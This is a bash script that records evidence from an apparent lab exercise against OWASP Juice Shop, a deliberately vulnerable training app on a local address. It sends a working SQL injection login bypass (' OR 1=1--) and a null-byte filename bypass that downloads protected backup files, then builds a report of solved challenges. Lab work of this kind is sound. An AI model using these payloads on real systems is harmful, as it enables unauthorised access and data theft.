#!/usr/bin/env bash
#
# evidence.sh — capture REPRODUCIBLE evidence of the attacks into ./evidence/.
# Run from Kali, after (or instead of) eyeballing the attacks.
#
#   TARGET=http://192.168.0.200:8088 ./evidence.sh
#
# Produces:
#   evidence/attack-<ts>.log        full attack.sh output (git-ignored)
#   evidence/files/                 downloaded artifacts + raw responses (git-ignored)
#   evidence/solved-challenges.md   COMMITTED proof: which Juice Shop challenges are solved
#
# Screenshots (XSS alert, Score Board UI) are still manual — see EVIDENCE.md.

set -uo pipefail
TARGET="${TARGET:-http://192.168.0.200:8088}"
TS="$(date +%Y%m%d-%H%M%S)"
DIR="evidence"; mkdir -p "$DIR/files"

echo "[*] target=$TARGET  ts=$TS"

# 1) Run the attack suite, keep the full log -----------------------------------
if [ -x ./attack.sh ]; then
  TARGET="$TARGET" ./attack.sh | tee "$DIR/attack-$TS.log"
else
  echo "(attack.sh not found/executable — skipping the run)"
fi

# 2) Save key artifacts (raw, git-ignored) -------------------------------------
echo "[*] saving artifacts -> $DIR/files/"
curl -s -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}' > "$DIR/files/sqli-login-response.json" 2>/dev/null
for f in coupons_2013.md.bak package.json.bak ; do
  curl -s "$TARGET/ftp/$f%2500.md" -o "$DIR/files/$f" 2>/dev/null
done
curl -s "$TARGET/api/Challenges/" -o "$DIR/files/challenges.json" 2>/dev/null

# 3) Generate the committed proof: solved-challenges report --------------------
echo "[*] building $DIR/solved-challenges.md"
python3 - "$TS" "$TARGET" "$DIR/files/challenges.json" > "$DIR/solved-challenges.md" <<'PY'
import sys, json
ts, target, path = sys.argv[1], sys.argv[2], sys.argv[3]
try:
    data = json.load(open(path)).get("data", [])
except Exception:
    data = []
solved = [c for c in data if c.get("solved")]
print(f"# Solved challenges — {len(solved)}/{len(data)}")
print()
print(f"_target: `{target}` · captured: {ts}_")
print()
if not data:
    print("> No data — is the target reachable and a real Juice Shop?")
else:
    print("| Challenge | Category | Difficulty |")
    print("|---|---|---|")
    for c in sorted(solved, key=lambda x: (x.get("category",""), x.get("name",""))):
        stars = "★" * int(c.get("difficulty", 0) or 0)
        print(f"| {c.get('name','?')} | {c.get('category','')} | {stars} |")
PY

echo "[*] done."
echo "    committed proof : $DIR/solved-challenges.md"
echo "    local artifacts : $DIR/files/  (git-ignored)"
echo "    full log        : $DIR/attack-$TS.log  (git-ignored)"
echo "    still manual     : screenshots of the XSS alert + Score Board (see EVIDENCE.md)"
